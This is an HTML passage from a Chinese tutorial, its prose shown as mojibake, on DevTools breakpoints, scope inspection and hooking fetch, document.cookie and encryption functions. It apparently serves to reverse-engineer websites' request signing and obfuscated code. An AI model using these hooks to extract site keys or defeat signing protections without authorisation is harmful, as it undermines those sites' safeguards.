      <h4 id="æ¡ä»¶æ–­ç‚¹-conditional-breakpoint">æ¡ä»¶æ–­ç‚¹ (Conditional Breakpoint)</h4>

      <p>å³é”®è¡Œå· â†’ &#8220;Add conditional breakpoint&#8221;</p>

      <p><strong>åº”ç”¨åœºæ™¯</strong>: åªåœ¨ç‰¹å®šæ¡ä»¶ä¸‹æš‚åœ</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åªåœ¨ userId ç­‰äº 123 æ—¶æš‚åœ</span>
<span class="nx">userId</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">123</span>

<span class="c1">// åªåœ¨ç¬¬ 10 æ¬¡å¾ªç¯æ—¶æš‚åœ</span>
<span class="nx">i</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">10</span>

<span class="c1">// åªåœ¨å‚æ•°åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²æ—¶æš‚åœ</span>
<span class="nx">params</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s2">&quot;target&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="æ—¥å¿—æ–­ç‚¹-logpoint">æ—¥å¿—æ–­ç‚¹ (Logpoint)</h4>

      <p>å³é”®è¡Œå· â†’ &#8220;Add logpoint&#8221;</p>

      <p><strong>åº”ç”¨åœºæ™¯</strong>: ä¸æš‚åœï¼Œåªæ‰“å°æ—¥å¿—ï¼ˆç›¸å½“äº <code>console.log</code> ä½†ä¸ä¿®æ”¹æºç ï¼‰</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¯­æ³•ï¼ˆä¸éœ€è¦å†™ console.logï¼‰</span>
<span class="s2">&quot;userId:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">userId</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;timestamp:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">timestamp</span>
</code></pre>
      </div>

      <h4 id="dom-æ–­ç‚¹-dom-breakpoint">DOM æ–­ç‚¹ (DOM Breakpoint)</h4>

      <p>åœ¨ Elements é¢æ¿å³é”®å…ƒç´  â†’ &#8220;Break on":</p>

      <ul>
        <li><strong>subtree modifications</strong>: å­å…ƒç´ è¢«ä¿®æ”¹</li>
        <li><strong>attribute modifications</strong>: å±æ€§è¢«ä¿®æ”¹ï¼ˆå¦‚ <code>class</code>, <code>style</code>ï¼‰</li>
        <li><strong>node removal</strong>: å…ƒç´ è¢«åˆ é™¤</li>
      </ul>

      <p><strong>åº”ç”¨åœºæ™¯</strong>: è¿½è¸ªæ˜¯è°ä¿®æ”¹äº†æŸä¸ª DOM å…ƒç´ </p>

      <h4 id="xhrfetch-æ–­ç‚¹">XHR/Fetch æ–­ç‚¹</h4>

      <p>Sources é¢æ¿ â†’ XHR/fetch Breakpoints â†’ æ·»åŠ  URL å…³é”®å­—</p>

      <p><strong>åº”ç”¨åœºæ™¯</strong>: åœ¨å‘é€åŒ…å« <code>/api/login</code> çš„è¯·æ±‚å‰è‡ªåŠ¨æ–­ç‚¹</p>

      <pre><code>å…³é”®å­—: /api/login
</code></pre>

      <h4 id="äº‹ä»¶ç›‘å¬å™¨æ–­ç‚¹-event-listener-breakpoint">äº‹ä»¶ç›‘å¬å™¨æ–­ç‚¹ (Event Listener Breakpoint)</h4>

      <p>Sources é¢æ¿ â†’ Event Listener Breakpoints â†’ å‹¾é€‰äº‹ä»¶ç±»å‹</p>

      <p><strong>å¸¸ç”¨äº‹ä»¶</strong>:</p>

      <ul>
        <li>Mouse â†’ <code>click</code>, <code>mousedown</code></li>
        <li>Keyboard â†’ <code>keydown</code>, <code>keypress</code></li>
        <li>Timer â†’ <code>setTimeout</code>, <code>setInterval</code></li>
      </ul>

      <h3 id="22-æ–­ç‚¹è°ƒè¯•æŠ€å·§">2.2 æ–­ç‚¹è°ƒè¯•æŠ€å·§</h3>

      <h4 id="å•æ­¥è°ƒè¯•å¿«æ·é”®">å•æ­¥è°ƒè¯•å¿«æ·é”®</h4>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>F8</strong></td>
            <td>Resume</td>
            <td>ç»§ç»­æ‰§è¡Œï¼ˆåˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼‰</td>
          </tr>
          <tr>
            <td><strong>F10</strong></td>
            <td>Step Over</td>
            <td>å•æ­¥è·³è¿‡ï¼ˆä¸è¿›å…¥å‡½æ•°å†…éƒ¨ï¼‰</td>
          </tr>
          <tr>
            <td><strong>F11</strong></td>
            <td>Step Into</td>
            <td>å•æ­¥è¿›å…¥ï¼ˆè¿›å…¥å‡½æ•°å†…éƒ¨ï¼‰</td>
          </tr>
          <tr>
            <td><strong>Shift+F11</strong></td>
            <td>Step Out</td>
            <td>è·³å‡ºå½“å‰å‡½æ•°</td>
          </tr>
          <tr>
            <td><strong>Ctrl+F8</strong></td>
            <td>Disable All Breakpoints</td>
            <td>ä¸´æ—¶ç¦ç”¨æ‰€æœ‰æ–­ç‚¹</td>
          </tr>
        </tbody>
      </table>

      <h4 id="é»‘ç›’è„šæœ¬-blackbox-script">é»‘ç›’è„šæœ¬ (Blackbox Script)</h4>

      <p>å³é”®æ–‡ä»¶ â†’ &#8220;Blackbox script&#8221;</p>

      <p><strong>ä½œç”¨</strong>: å•æ­¥è°ƒè¯•æ—¶è‡ªåŠ¨è·³è¿‡è¯¥æ–‡ä»¶ï¼ˆé€šå¸¸ç”¨äºè·³è¿‡ç¬¬ä¸‰æ–¹åº“ï¼‰</p>

      <p><strong>ç¤ºä¾‹</strong>: è·³è¿‡ jQuery, Lodash ç­‰åº“æ–‡ä»¶</p>

      <pre><code>Settings â†’ Blackboxing â†’ Add pattern
Pattern: jquery.*\.js
Pattern: lodash.*\.js
</code></pre>

      <h4 id="watch-è¡¨è¾¾å¼-watch-expressions">Watch è¡¨è¾¾å¼ (Watch Expressions)</h4>

      <p>åœ¨æ–­ç‚¹æš‚åœæ—¶ï¼Œå³ä¾§ Watch é¢æ¿å¯ä»¥ç›‘æ§è¡¨è¾¾å¼çš„å€¼</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ·»åŠ ä»¥ä¸‹è¡¨è¾¾å¼</span>
<span class="nx">params</span><span class="p">.</span><span class="nx">sign</span>
<span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span>
<span class="nx">btoa</span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nx">user_id</span><span class="p">)</span>
</code></pre>
      </div>

      <p>æ¯æ¬¡æ–­ç‚¹åœä¸‹æ—¶ï¼Œè¿™äº›è¡¨è¾¾å¼éƒ½ä¼šè‡ªåŠ¨æ±‚å€¼å¹¶æ˜¾ç¤ºã€‚</p>

      <hr />

      <h2 id="3-å†…å­˜æ¼«æ¸¸-scope-sniffing">3. å†…å­˜æ¼«æ¸¸ (Scope Sniffing)</h2>

      <p>åœ¨æ–­ç‚¹åœä¸‹åï¼ŒConsole ä¸ä»…ä»…æ˜¯ç”¨æ¥æ‰“å° log çš„ï¼Œå®ƒæ˜¯ä¸€ä¸ªå…¨åŠŸèƒ½çš„ REPL (Read-Eval-Print Loop)ã€‚</p>

      <h3 id="31-æ£€æŸ¥ä½œç”¨åŸŸå˜é‡">3.1 æ£€æŸ¥ä½œç”¨åŸŸå˜é‡</h3>

      <p><strong>Scope é¢æ¿æ˜¾ç¤º</strong>:</p>

      <ul>
        <li><strong>Local</strong>: å½“å‰å‡½æ•°çš„å±€éƒ¨å˜é‡</li>
        <li><strong>Closure</strong>: é—­åŒ…å˜é‡ï¼ˆå¤–å±‚å‡½æ•°çš„å˜é‡ï¼‰</li>
        <li><strong>Global</strong>: å…¨å±€å˜é‡ (<code>window</code>)</li>
      </ul>

      <p><strong>æŠ€å·§</strong>: åœ¨ Console ä¸­ç›´æ¥è®¿é—®</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨æ–­ç‚¹æš‚åœæ—¶ï¼ŒConsole çš„ä¸Šä¸‹æ–‡å°±æ˜¯å½“å‰å‡½æ•°</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">params</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ‰“å°å±€éƒ¨å˜é‡ params</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">this</span><span class="p">);</span><span class="w">    </span><span class="c1">// æ‰“å° this å¯¹è±¡</span>
</code></pre>
      </div>

      <h3 id="32-æ£€æŸ¥é—­åŒ…å˜é‡">3.2 æ£€æŸ¥é—­åŒ…å˜é‡</h3>

      <p><strong>é—®é¢˜</strong>: æŸäº›åŠ å¯†å‡½æ•°ä½¿ç”¨äº†é—­åŒ…å˜é‡ï¼ŒLocal Scope çœ‹ä¸åˆ°</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">createEncryptor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">secretKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;hardcoded_key_2024&quot;</span><span class="p">;</span><span class="w">  </span><span class="c1">// é—­åŒ…å˜é‡</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// ä½¿ç”¨ secretKeyï¼Œä½† Local Scope é‡Œçœ‹ä¸åˆ°</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">secretKey</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">}</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">createEncryptor</span><span class="p">();</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <ol>
        <li>æŸ¥çœ‹ Scope é¢æ¿ â†’ <strong>Closure</strong> éƒ¨åˆ†</li>
        <li>æˆ–åœ¨ Console é‡Œç›´æ¥è¾“å…¥å˜é‡åè¯•è¯•</li>
      </ol>

      <h3 id="33-å¯¼å‡ºå¤§å¯¹è±¡æ•°ç»„">3.3 å¯¼å‡ºå¤§å¯¹è±¡/æ•°ç»„</h3>

      <p><strong>åœºæ™¯</strong>: æ··æ·†ä»£ç é¢„å…ˆç”Ÿæˆäº†ä¸€ä¸ªå·¨å¤§çš„å­—ç¬¦ä¸²æ•°ç»„ï¼ˆå¤§è¡¨ï¼‰</p>

      <p><strong>æ–¹æ³• 1: copy() å‡½æ•°</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Console ä¸­æ‰§è¡Œ</span>
<span class="nx">copy</span><span class="p">(</span><span class="nx">bigArray</span><span class="p">);</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨å¤åˆ¶åˆ°å‰ªè´´æ¿</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: ä¸‹è½½ä¸ºæ–‡ä»¶</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å¯¼å‡ºä¸º JSON æ–‡ä»¶</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">bigArray</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">blob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Blob</span><span class="p">([</span><span class="nx">json</span><span class="p">],</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="w"> </span><span class="p">});</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">URL</span><span class="p">.</span><span class="nx">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">href</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">url</span><span class="p">;</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">download</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;bigArray.json&#39;</span><span class="p">;</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">click</span><span class="p">();</span>
</code></pre>
      </div>

      <h3 id="34-ä¿®æ”¹è¿è¡Œæ—¶å˜é‡">3.4 ä¿®æ”¹è¿è¡Œæ—¶å˜é‡</h3>

      <p>åœ¨æ–­ç‚¹æš‚åœæ—¶ï¼Œå¯ä»¥åœ¨ Console ä¸­ç›´æ¥ä¿®æ”¹å˜é‡ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ä¿®æ”¹å‚æ•°æµ‹è¯•ä¸åŒæƒ…å†µ</span>
<span class="nx">params</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1234567890</span><span class="p">;</span>
<span class="nx">params</span><span class="p">.</span><span class="nx">sign</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;test_sign&quot;</span><span class="p">;</span>

<span class="c1">// ä¿®æ”¹å¯¹è±¡åŸå‹é“¾</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">myDebug</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="4-æ¢é’ˆæŠ€æœ¯-probing">4. æ¢é’ˆæŠ€æœ¯ (Probing)</h2>

      <p>å¦‚æœæ‰¾ä¸åˆ°æŸä¸ªå‡½æ•°åœ¨å“ªè¢«è°ƒç”¨ï¼Œå¯ä»¥"æŠ•çŸ³é—®è·¯"ã€‚</p>

      <h3 id="41-æ±¡ç‚¹è¿½è¸ª-property-access-interception">4.1 æ±¡ç‚¹è¿½è¸ª (Property Access Interception)</h3>

      <p><strong>åœºæ™¯</strong>: æ€€ç–‘æŸä¸ªå¯¹è±¡çš„å±æ€§ <code>x</code> ä¼šè¢«åŠ å¯†å‡½æ•°è¯»å–</p>

      <p><strong>æ–¹æ³•</strong>: ä½¿ç”¨ <code>Object.defineProperty</code> åŠ«æŒå±æ€§è®¿é—®</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="o">:</span><span class="w"> </span><span class="s2">&quot;original_value&quot;</span><span class="w"> </span><span class="p">};</span>

<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;x&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s2">&quot;è¯»å–äº† obj.x&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ‰“å°è°ƒç”¨æ ˆ</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// è‡ªåŠ¨æ–­ç‚¹</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s2">&quot;original_value&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s2">&quot;ä¿®æ”¹äº† obj.x ä¸º&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <p><strong>å®æˆ˜æ¡ˆä¾‹</strong>: è¿½è¸ª Cookie è¯»å–</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŠ«æŒ document.cookie</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">_cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">defineProperty</span><span class="p">(</span><span class="nb">document</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">get</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s2">&quot;è¯»å–äº† cookie&quot;</span><span class="p">);</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">_cookie</span><span class="p">;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">set</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">trace</span><span class="p">(</span><span class="s2">&quot;è®¾ç½®äº† cookie:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">value</span><span class="p">);</span>
<span class="w">        </span><span class="nx">_cookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">value</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="42-å‡½æ•°åŠ«æŒ-function-hooking">4.2 å‡½æ•°åŠ«æŒ (Function Hooking)</h3>

      <p><strong>åœºæ™¯</strong>: è¿½è¸ªæŸä¸ªå‡½æ•°çš„è°ƒç”¨</p>

      <p><strong>æ–¹æ³• 1: åŠ«æŒå…¨å±€å‡½æ•°</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">_fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">fetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[Fetch]&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span><span class="w">  </span><span class="c1">// æ‰“å° URL</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// å‘èµ· fetch è¯·æ±‚å‰æ–­ç‚¹</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_fetch</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: åŠ«æŒåŸå‹æ–¹æ³•</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">_stringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">;</span>
<span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[JSON.stringify]&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">obj</span><span class="p">);</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_stringify</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">arguments</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 3: Proxy ä»£ç†</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">apply</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[è°ƒç”¨]&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">target</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">target</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">thisArg</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">};</span>

<span class="c1">// åŠ«æŒåŠ å¯†å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalEncrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Proxy</span><span class="p">(</span><span class="nx">originalEncrypt</span><span class="p">,</span><span class="w"> </span><span class="nx">handler</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="43-å¼‚å¸¸æ–­ç‚¹-exception-breakpoint">4.3 å¼‚å¸¸æ–­ç‚¹ (Exception Breakpoint)</h3>

      <p><strong>æ–¹æ³•</strong>: Sources é¢æ¿ â†’ å‹¾é€‰ &#8220;Pause on exceptions&#8221;</p>

      <p><strong>åº”ç”¨åœºæ™¯</strong>:</p>

      <ul>
        <li>ä»£ç æŠ›å‡ºé”™è¯¯æ—¶è‡ªåŠ¨æš‚åœ</li>
        <li>è¿½è¸ª <code>try-catch</code> ä¸­æ•è·çš„å¼‚å¸¸</li>
      </ul>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// æŸä¸ªä¼šæŠ›å¼‚å¸¸çš„åŠ å¯†å‡½æ•°</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">riskyEncrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å¦‚æœå‹¾é€‰äº† &quot;Pause on caught exceptions&quot;ï¼Œä¼šåœ¨è¿™é‡Œæš‚åœ</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="5-å¼‚æ­¥è°ƒè¯•-async-debugging">5. å¼‚æ­¥è°ƒè¯• (Async Debugging)</h2>

      <h3 id="51-promise-è°ƒè¯•">5.1 Promise è°ƒè¯•</h3>

      <p><strong>é—®é¢˜</strong>: Promise é“¾ä¸­æŸä¸ªæ­¥éª¤å‡ºé”™ï¼Œéš¾ä»¥å®šä½</p>

      <p><strong>è§£å†³æ–¹æ¡ˆ 1</strong>: å¯ç”¨ Async Stack Traces</p>

      <pre><code>DevTools Settings â†’ Enable async stack traces
</code></pre>

      <p><strong>æ•ˆæœ</strong>: è°ƒç”¨æ ˆä¼šæ˜¾ç¤ºå®Œæ•´çš„ Promise é“¾</p>

      <pre><code>Call Stack:
then (api.js:123)  â† å½“å‰ Promise
  â†‘ (async)
fetchData (main.js:45)  â† å‘èµ· Promise çš„ä½ç½®
</code></pre>

      <p><strong>è§£å†³æ–¹æ¡ˆ 2</strong>: åœ¨ Promise ä¸­æ‰‹åŠ¨æ–­ç‚¹</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;/api/data&quot;</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">response</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ–­ç‚¹</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
<span class="w">    </span><span class="p">})</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">debugger</span><span class="p">;</span><span class="w">  </span><span class="c1">// æ–­ç‚¹</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>
</code></pre>
      </div>

      <h3 id="52-asyncawait-è°ƒè¯•">5.2 async/await è°ƒè¯•</h3>

      <p>ä½¿ç”¨ <code>async/await</code> æ¯” Promise é“¾æ›´å®¹æ˜“è°ƒè¯•ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">fetchData</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;/api/data&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ–­ç‚¹</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span><span class="w">         </span><span class="c1">// æ–­ç‚¹</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">json</span><span class="p">);</span><span class="w">                          </span><span class="c1">// æ–­ç‚¹</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>ä¼˜åŠ¿</strong>: å¯ä»¥åƒåŒæ­¥ä»£ç ä¸€æ ·å•æ­¥è°ƒè¯• (F10)</p>

      <h3 id="53-settimeoutsetinterval-è°ƒè¯•">5.3 setTimeout/setInterval è°ƒè¯•</h3>

      <p><strong>æ–¹æ³• 1</strong>: Event Listener Breakpoint</p>

      <pre><code>Sources â†’ Event Listener Breakpoints â†’ Timer â†’ setInterval fired
</code></pre>

      <p><strong>æ–¹æ³• 2</strong>: åŠ«æŒå®šæ—¶å™¨**</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">_setTimeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="p">;</span>
